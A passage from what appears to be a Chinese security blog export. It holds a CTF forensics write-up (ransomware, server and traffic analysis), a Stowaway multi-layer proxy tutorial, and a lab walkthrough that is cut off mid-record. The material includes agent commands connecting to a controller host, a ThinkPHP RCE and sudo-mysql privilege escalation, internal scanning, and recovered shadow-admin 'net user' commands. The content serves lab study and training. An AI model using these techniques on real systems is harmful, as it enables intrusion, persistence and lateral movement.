分析GIFT.exe，该病毒修改的壁纸md5(格式：大写md5)\nresource hacker 能获取 LOVE2.exe 释放的资源壁纸：\n导出计算md5\n答案：733FC4483C0E7DB1C034BE5246DF5EC0\nexe逆向-6 分析GIFT.exe，未对哪些后缀的文件进行加密\n创几个后缀文件模拟\n答案：A.doc B.xlsx E.ppt\nexe逆向-7 分析GIFT.exe，病毒加密后的文件类型是什么(格式：DOCX文档)\n.love 后缀，查看文件属性\n答案：LOVE Encrypted File\nexe逆向-8 分析GIFT.exe，壁纸似乎被隐形水印加密过了？请找到其中的Flag3(格式：flag3{xxxxxxxx})\n盲水印：\n答案：flag3{20241224_Our_First_Meet}\nexe逆向-9 分析GIFT.exe，病毒加密文件所使用的方法是什么(格式：Base64)\n答案：RSA\nexe逆向-10 分析GIFT.exe，请解密test.love得到flag4(格式：flag4{xxxxxxxx})\nlove.jpeg尾部存在rsa私钥\n解密脚本：\nfrom cryptography.hazmat.primitives import serialization from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.backends import default_backend # 读取私钥 with open(\u0026#34;private.pem\u0026#34;, \u0026#34;rb\u0026#34;) as key_file: private_key = serialization.load_pem_private_key( key_file.read(), password=None, backend=default_backend() ) # 打印密钥位数和块大小 key_size_bits = private_key.key_size key_size_bytes = key_size_bits // 8 print(f\u0026#34;私钥大小: {key_size_bits} 位 ({key_size_bytes} 字节)\u0026#34;) # 读取加密文件 with open(\u0026#34;test.love\u0026#34;, \u0026#34;rb\u0026#34;) as f: encrypted_data = f.read() # 分块解密（每块长度等于密钥长度） decrypted_data = b\u0026#34;\u0026#34; for i in range(0, len(encrypted_data), key_size_bytes): block = encrypted_data[i:i + key_size_bytes] if len(block) != key_size_bytes: raise ValueError(f\u0026#34;第 {i//key_size_bytes + 1} 块大小不等于密钥长度，可能文件损坏\u0026#34;) decrypted_block = private_key.decrypt( block, padding.PKCS1v15() ) decrypted_data += decrypted_block # 打印结果 try: print(\u0026#34;解密内容：\u0026#34;) print(decrypted_data.decode(\u0026#34;utf-8\u0026#34;)) except UnicodeDecodeError: print(\u0026#34;解密完成，但内容不是有效的 UTF-8，可以保存为二进制文件\u0026#34;) # 也可以写入文件 with open(\u0026#34;decrypted_output.bin\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(decrypted_data) print(\u0026#34;已保存为 decrypted_output.bin\u0026#34;) 答案：flag4{104864DF-C420-04BB5F51F267}\n服务器取证 公司服务器用的是宝塔面板\n服务器取证-1 该电脑最早的开机时间是什么(格式：2025/1/1 01:01:01)\n答案：2022/2/23 12:23:49\n服务器取证-2 服务器操作系统内核版本(格式：1.1.1-123)\n答案：3.10.0-1160.119.1.el7.x86_64\n服务器取证-3 除系统用户外，总共有多少个用户(格式：1)\n答案：3\n服务器取证-4 分析起早王的服务器检材，Trojan服务器混淆流量所使用的域名是什么(格式：xxx.xxx)\n答案：wyzshop1.com\n服务器取证-5 分析起早王的服务器检材，Trojan服务运行的模式为\nexamples目录下存在不同模式的实例json，发现与nat类似\n答案：B. nat\n服务器取证-6 关于 Trojan服务器配置文件中配置的remote_addr 和 remote_port 的作用，正确的是\n答案：A. 代理流量转发到外部互联网服务器\n服务器取证-7 分析网站后台登录密码的加密逻辑，给出密码sbwyz1加密后存在数据库中的值(格式：1a2b3c4d)\n在目录 /www/wwwroot/www.tpshop.com 下寻找加密逻辑 /www/wwwroot/www.tpshop.com/application/admin/controller/Admin.php：\n$enNewPwd = encrypt($newPwd); 全局搜索encrypt函数：\n/www/wwwroot/www.tpshop.com/application/function.php：\nfunction encrypt($str){ return md5(C(\u0026#34;AUTH_CODE\u0026#34;).$str); } 同样的操作，全局搜索 AUTH_CODE，/www/wwwroot/www.tpshop.com/application/config.php：\n// 密码加密串 \u0026#39;AUTH_CODE\u0026#39; =\u0026gt; \u0026#34;TPSHOP\u0026#34;, //安装完毕之后不要改变，否则所有密码都会出错 计算md5(TPSHOPsbwyz1)\n答案：f8537858eb0eabada34e7021d19974ea\n服务器取证-8 网站后台显示的服务器GD版本是多少(格式：1.1.1 abc)\nbt default 查看初始账号和密码信息：\n初始账号密码：b2zobisy/0f5acdc4，但是无法登录，bt 5 重置密码：\n登录后添加域名：\n登录phpadmin查看数据库：\n发现数据库是空的，这样无法登录到网站后台也不会有任何数据，想到 起早王的windows上有一段sql，应该是tpshop2.0的备份 20250410-094648-1.sql：\n日志中存有后台登录地址：\n在数据库里把admin密码改成 sbwyz1 对应的哈希f8537858eb0eabada34e7021d19974ea尝试登录后台，提示网络错误，查看网站目录下的数据库连接文件，发现账号密码和实际数据不一致，进行修改：\n成功登录后台：\nGD版本：\n答案：2.1.0 compatible\n服务器取证-9 网站后台中2016-04-01 00:00:00到2025-04-01 00:00:00订单列表有多少条记录(格式：1)\n答案：1292\n服务器取证-10 在网站购物满多少免运费(格式：1)\n答案：100000\n服务器取证-11 分析网站日志，成功在网站后台上传木马的攻击者IP是多少(格式：1.1.1.1)\n错误日志里有大量 222.2.2.2 的记录：\n结合 www.tpshop.com.log：\n典型的webshell php文件名 peiqi.php\n答案：222.2.2.2\n服务器取证-12 攻击者插入的一句话木马文件的sha256值是多少(格式：大写sha256)\n答案：870BF66B4314A5567BD92142353189643B07963201076C5FC98150EF34CBC7CF\n服务器取证-13 攻击者使用工具对内网进行扫描后，rdp扫描结果中的账号密码是什么(格式：abc:def)\ngoon扫描工具：\nresult.txt中rdp部分：\n------------------------------------rdp------------------------------------\r[RDP] 192.168.100.254:3389 administrator:Aa123456@ 答案：administrator:Aa123456@\n服务器取证-14 对于每个用户，计算其注册时间（用户表中的注册时间戳）到首次下单时间（订单表中最早时间戳）的间隔，找出间隔最短的用户id。（格式：1）\n查询语句：\nSELECT u.user_id, MIN(d.create_time) - u.reg_time as time_diff FROM tp_users u JOIN tp_delivery_doc d ON u.user_id = d.user_id GROUP BY u.user_id ORDER BY time_diff ASC LIMIT 1; 答案：180\n服务器取证-15 统计每月订单数量，找出订单最多的月份（例：2025年9月）\n查询语句：\nSELECT EXTRACT(YEAR FROM FROM_UNIXTIME(d.create_time)) as year, EXTRACT(MONTH FROM FROM_UNIXTIME(d.create_time)) as month, COUNT(*) as order_count FROM tp_delivery_doc d GROUP BY year, month ORDER BY order_count DESC LIMIT 1; 答案：2017年1月\n服务器取证-16 找出连续三天内下单的用户并统计总共有多少个（格式：1）\n查询语句：\nSELECT t1.user_id, MIN(FROM_UNIXTIME(t1.add_time)) AS earliest_order_date FROM tp_order t1 WHERE EXISTS ( SELECT 1 FROM tp_order t2 WHERE t2.user_id = t1.user_id AND FROM_UNIXTIME(t1.add_time) \u0026gt; FROM_UNIXTIME(t2.add_time) AND DATEDIFF(FROM_UNIXTIME(t1.add_time), FROM_UNIXTIME(t2.add_time)) \u0026lt;= 3 ) GROUP BY t1.user_id ORDER BY t1.user_id; 答案：110\n流量分析 流量分析-1 请问侦查人员是用哪个接口进行抓到蓝牙数据包的（格式：DVI1-2.1）\n答案：COM3-3.6\n流量分析-2 起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备的原始设备名称为什么（格式：XXX_xxx 具体大小写按照原始内容）\n答案：Flipper_123all\n流量分析-3 起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备修改成耳机前后的大写MAC地址分别为多少（格式：32位小写md5(原MAC地址_修改后的MAC地址) ，例如md5(11:22:33:44:55:66_77:88:99:AA:BB:CC)=a29ca3983de0bdd739c97d1ce072a392 ）\n将流量包导出为json格式：\ntshark -r BLE.pcap -T json \u0026gt; BLE.json 倩倩耳机的设备名称：QQ_WF_SP8OON\n根据时间和设备名称能找到先后三个个MAC地址，第一个对应Flipper_123all，后二个对应修改前后的QQ_WF_SP8OON：\n\u0026#34;btle.advertising_address\u0026#34;: \u0026#34;80:e1:26:33:32:31\u0026#34;\r\u0026#34;btle.advertising_address\u0026#34;: \u0026#34;80:e1:26:35:32:31\u0026#34;\r\u0026#34;btle.advertising_address\u0026#34;: \u0026#34;52:00:52:10:13:14\u0026#34; 根据格式计算 md5(80:E1:26:33:32:31_52:00:52:10:13:14)\n答案：97d79a5f219e6231f7456d307c8cac68\n流量分析-4 流量包中首次捕获到该伪装设备修改自身名称的UTC+0时间为？（格式：2024/03/07 01:02:03.123）\n第一次出现 QQ_WF_SP8OON 对应的时间：\n\u0026#34;frame.time\u0026#34;: \u0026#34;Apr 9, 2025 10:31:26.710747000 中国标准时间\u0026#34; UTC+0，答案：2025/04/09 02:31:26.710\n流量分析-5 起早王中途还不断尝试使用自己的手机向倩倩电脑进行广播发包，请你找出起早王手机蓝牙的制造商数据（格式：0x0102030405060708）\nCracked是起早王的手机设备，wireshark里过滤字符串：\n答案：0x0701434839313430\n流量分析-6 起早王的真名是什么（格式：Cai_Xu_Kun 每个首字母均需大写 ）\ntshark -r USBPcap.pcapng -Y usb.src==2.4.1 -T fields -e usbhid.data \u0026gt; usb.txt usb提取脚本：\nnormalKeys = {\u0026#34;04\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;[\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;]\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} shiftKeys = {\u0026#34;04\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;^\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;\u0026amp;\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;_\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;{\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;}\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;|\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;:\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;~\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;\u0026lt;\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;\u0026gt;\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;?\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} output = [] last = [] new = [] keys = open(\u0026#39;usb.txt\u0026#39;) press = \u0026#39;\u0026#39; for line in keys: try: if line[2]!=\u0026#39;0\u0026#39; or (line[3]!=\u0026#39;0\u0026#39; and line[3]!=\u0026#39;2\u0026#39;): continue offset = 6 new = [] while line[offset:offset+2] != \u0026#39;00\u0026#39;: press = line[offset:offset+2] if press in normalKeys.keys(): if line[3]==\u0026#39;0\u0026#39;: key = normalKeys[press] else: key = shiftKeys[press] else: key = \u0026#39;[unknown]\u0026#39; if press not in last: output.append(key) new.append(press) offset += 2 except: print(line) finally: last = new keys.close() flag=0 for i in range(len(output)): try: if output[i]==\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;: flag = 1-flag if flag!=0: output[i]=output[i].upper() except: pass output = [x for x in output if x != \u0026#39;\u0026lt;CAP\u0026gt;\u0026#39;] new_output = [] for i in range(len(output)): if output[i] == \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;: new_output.append(output[i]) # 根据需求添加该删除功能，有些数据可能隐藏在删除的内容里 # new_output = new_output[:-1] else: new_output.append(output[i]) print (\u0026#34;\u0026#34;.join(new_output)) 整理一下：\nbao bao,zui jin you ge nan sheng xiang zhui wo,\rta jiao wang qi zhao(被删除) qi zao wang ta shuo ta ai wo,\rdan shi cong bu bang wo na kuai di,\rhao fan a\rcmd\u0026lt;RET\u0026gt; whoami\u0026lt;RET\u0026gt;\rnet user\u0026lt;RET\u0026gt;\rnet user qianqianwoaini$ abcdefghijkImn /add\u0026lt;RET\u0026gt;\rnet localgroup administrators qianqianwoaini$ /add\u0026lt;RET\u0026gt;\rnet user qianqianwoaini$ /del\u0026lt;RET\u0026gt;\rnet localgroup administrators qianqianwoaini$ /add\u0026lt;RET\u0026gt;\rrundll32 url.dll,FileProtocolHandler https://fakeupdate.net/win10ue/bsod.html\u0026lt;RET\u0026gt; 答案：Wang_Qi_Zhao\n流量分析-7 起早王对倩倩的电脑执行了几条cmd里的命令（格式：1 ）\n答案：7\n流量分析-8 倩倩电脑中影子账户的账户名和密码为什么（格式：32位小写md5(账号名称_密码) ，例如md5(zhangsan_123456)=9dcaac0e4787b213fed42e5d78affc75 ）\nmd5(qianqianwoaini$_abcdefghijkImn)\n答案：53af9cd5e53e237020bea0932a1cbdaa\n流量分析-9 起早王对倩倩的电脑执行的最后一条命令是什么（格式：32位小写md5(完整命令)，例如md5(echo \u0026ldquo;qianqianwoaini\u0026rdquo; \u0026gt; woshiqizaowang.txt)=1bdb83cfbdf29d8c2177cc7a6e75bae2 ）\nmd5(rundll32 url.dll,FileProtocolHandler https://fakeupdate.net/win10ue/bsod.html)\n答案：0566c1d6dd49db699d422db31fd1be8f\n参考资料：\nhttps://jasmineaura.github.io/AuraBlog/cybersecurity/k1tx6hq6/\nhttps://www.cnblogs.com/WXjzc/p/18840490\n","permalink":"https://blog.w8nn9z.top/posts/forensics/phb2025/","summary":"","title":"平航杯 2025"},{"content":"根据不同操作系统选择不同的Stowaway admin/client可执行文件\n单层代理 服务器端开放2345端口，设置连接key为114514，即控制端：\n./linux_x64_admin -l 2345 -s 114514 客户端连接对应服务器端端口，可以设置掉线8s后重连，即受控端：\nwindows_x64_agent.exe -c 61.139.2.128:2345 -s 114514 --reconnect 8 使用detail命令查看节点状态：\n(admin) \u0026gt;\u0026gt; detail 在控制端3456端口建立代理：\n(admin) \u0026gt;\u0026gt; use 0\r(node 0) \u0026gt;\u0026gt; socks 3456 可以直接进shell对受控端进行管理：\n(node 0) \u0026gt;\u0026gt; shell 攻击机配置/etc/proxychains4.conf代理：\nsocks5 控制端ip 3456 后续可以利用proxychains向内网执行各种命令，例如通过ssh登录到内网：\nproxychains ssh 内网目标用户名@受控端内网目标服务器的ip -p 22 多层代理 在单层代理的基础上，继续往内网服务器上传agent可执行文件，假设是linux的服务器，可以通过scp进行传输：\nproxychains scp linux_x64_agent 内网目标用户名@受控端内网目标服务器的ip:/tmp/agent 先在入口机，即第一台受控端上开启监听，输入监听端口6666：\n(node 0) \u0026gt;\u0026gt; listen\r[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you\u0026#39;re controlling was started in the corresponding way! [*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port! [*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\r[*] Please input the [ip:]\u0026lt;port\u0026gt; : 6666\r[*] Waiting for response...... [*] Node is listening on 6666 第二台受控端连接到入口机：\n./linux_x64_agent -c 入口机内网ip:6666 -s 114514 --reconnect 8 如果连接成功，控制端会新增一个节点：\n[*] New node online! Node id is 1 后续操作都是类似的，最终可以搭建多层代理\n参考资料：\nhttps://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/\nhttps://k0u1g.cn/CyberSec/0x06%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/Stowaway.html\n","permalink":"https://blog.w8nn9z.top/posts/pentest/stowaway/","summary":"","title":"Stowaway + ProxyChains实现多层内网代理搭建"},{"content":"Initial 靶机ip:39.99.239.120\nnmap扫描开放端口及服务：\n$ nmap 39.99.239.120 --min-rate 10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-22 23:43 CST Nmap scan report for 39.99.239.120 Host is up (0.061s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds fscan扫描漏洞：\n$ ./fscan -h 39.99.239.120 ┌──────────────────────────────────────────────┐ │ ___ _ │ │ / _ \\ ___ ___ _ __ __ _ ___| | __ │ │ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ │ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ │ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ └──────────────────────────────────────────────┘ Fscan Version: 2.0.1 [1.1s] 已选择服务扫描模式 [1.1s] 开始信息扫描 [1.1s] 最终有效主机数量: 1 [1.1s] 开始主机扫描 [1.1s] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle [1.1s] 有效端口数量: 233 [1.2s] [*] 端口开放 39.99.239.120:80 [1.2s] [*] 端口开放 39.99.239.120:22 [4.1s] 扫描完成, 发现 2 个开放端口 [4.1s] 存活端口数量: 2 [4.1s] 开始漏洞扫描 [4.2s] POC加载完成: 总共387个，成功387个，失败0个 [4.3s] [*] 网站标题 http://39.99.239.120 状态码:200 长度:5578 标题:Bootstrap Material Admin [9.8s] [+] 目标: http://39.99.239.120:80 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: 参考链接:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce [17.2s] 扫描已完成: 3/3 可以看到web服务存在thinkphp5.0.23-rce的漏洞，利用工具 ThinkphpGUI 直接打：\n蚁剑连上webshell，suid权限的文件没什么可利用的，看看 www-data 用户有什么可以执行的命令：\n(www-data:/) $ find / -perm -u=s -type f 2\u0026gt;/dev/null /usr/bin/umount /usr/bin/newgrp /usr/bin/sudo /usr/bin/su /usr/bin/at /usr/bin/chsh /usr/bin/stapbpf /usr/bin/staprun /usr/bin/chfn /usr/bin/gpasswd /usr/bin/fusermount /usr/bin/passwd /usr/bin/mount /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device (www-data:/) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql sudo mysql提权：\nsudo mysql -e \u0026#39;\\! ls /root\u0026#39; sudo mysql -e \u0026#39;\\! ls /root/flag\u0026#39; sudo mysql -e \u0026#39;\\! cat /root/flag/flag01.txt\u0026#39; flag01.txt：\n(www-data:/) $ sudo mysql -e \u0026#39;\\! cat /root/flag/flag01.txt\u0026#39;\r██ ██ ██ ██ ███████ ███████ ██ ████ ██ ████████ ░░██ ██ ░██ ████ ██░░░░░██ ░██░░░░██ ████ ░██░██ ░██ ██░░░░░░██\r░░██ ██ ░██ ██░░██ ██ ░░██░██ ░██ ██░░██ ░██░░██ ░██ ██ ░░ ░░███ ░██ ██ ░░██ ░██ ░██░███████ ██ ░░██ ░██ ░░██ ░██░██ ██░██ ░██ ██████████░██ ░██░██░░░██ ██████████░██ ░░██░██░██ █████\r██ ░░██ ░██░██░░░░░░██░░██ ██ ░██ ░░██ ░██░░░░░░██░██ ░░████░░██ ░░░░██\r██ ░░██░██░██ ░██ ░░███████ ░██ ░░██░██ ░██░██ ░░███ ░░████████ ░░ ░░ ░░ ░░ ░░ ░░░░░░░ ░░ ░░ ░░ ░░ ░░ ░░░ ░░░░░░░░ Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.\rflag01: flag{60b53231- 后续打内网，先用蚁剑上传 fscan 到 /tmp 目录下，查一下ip网段：\n(www-data:/tmp) $ ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:05:d1:5c brd ff:ff:ff:ff:ff:ff inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 1892158414sec preferred_lft 1892158414sec inet6 fe80::216:3eff:fe05:d15c/64 scope link valid_lft forever preferred_lft forever 先给可执行权限，fscan 扫描后的结果会保存在当前目录下的 result.txt 中：\n(www-data:/tmp) $ chmod u+x fscan (www-data:/tmp) $ ./fscan -h 172.22.1.0/24 (www-data:/tmp) $ cat result.txt [2025-10-22 23:58:56] [HOST] 目标:172.22.1.15 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:56] [HOST] 目标:172.22.1.18 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:57] [HOST] 目标:172.22.1.2 状态:alive 详情:protocol=ICMP [2025-10-22 23:58:57] [HOST] 目标:172.22.1.21 状态:alive 详情:protocol=ICMP [2025-10-22 23:59:01] [PORT] 目标:172.22.1.15 状态:open 详情:port=80 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.15 状态:open 详情:port=22 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=445 [2025-10-22 23:59:01] 